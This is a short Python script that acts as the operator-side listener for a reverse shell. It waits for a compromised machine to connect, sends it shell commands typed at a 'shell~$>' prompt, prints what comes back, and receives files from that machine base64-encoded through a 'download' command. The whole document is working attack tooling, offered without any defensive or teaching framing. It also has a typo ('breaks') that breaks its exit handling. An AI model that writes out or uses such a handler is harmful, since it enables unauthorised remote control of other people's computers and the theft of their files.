import socket

import base64

import platform



SERVER_HOST = input(str("[+]Enter The Remote Ip:"))

# use your ur remote ip 

SERVER_PORT = int(input("[+]Enter the remote port:"))

# use remote port 

BUFFER_SIZE =  6144 * 128 

#buffer_size to send the message or data 

SEPARATOR = "<sep><sep>"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#scoket connection intilaization
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)

print(f"\n[+]Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()

print(f"\n[+]{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()


print("\n[+] Current working directory:", cwd)


while True:

    command = input(f"shell~$> ")

    if not command.strip():

        continue


    client_socket.send(command.encode())

    if command[:2].lower()=="cd":

            continue

    if command.lower() == "exit":

        breaks
    if command[:8]=="download":

        try:

            with open(command[9:],'wb') as file:

                file_data=client_socket.recv(BUFFER_SIZE).decode()

                file.write(base64.b64decode(file_data))

                continue

        except:

            print("failed")

            continue

    else:

        try:

            output = client_socket.recv(BUFFER_SIZE).decode()

            results, cwd = output.split(SEPARATOR)

            print(results)

        except ValueError:

            continue
